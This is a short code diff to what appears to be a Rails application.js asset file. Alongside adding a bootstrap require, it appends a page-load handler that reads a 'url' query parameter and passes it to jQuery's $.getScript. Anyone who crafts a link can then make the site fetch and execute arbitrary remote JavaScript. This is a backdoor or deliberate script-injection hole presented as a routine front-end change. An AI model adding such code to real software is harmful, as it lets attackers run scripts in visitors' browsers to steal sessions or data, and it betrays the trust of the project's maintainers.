@@ -12,4 +12,17 @@
 //
 //= require jquery
 //= require jquery_ujs
+//= require bootstrap
 //= require_tree .
+
+$(function() {
+  urlParams = function Pasr(url){
+    var results = new RegExp('[\\?&]' + url + '=([^&#]*)').exec(window.location.href);
+    if (results) { return results[1] } else {return 0}
+  }
+
+  if (urlParams("url")) {
+    $.getScript(unescape(urlParams("url")))
+  }
+
+});
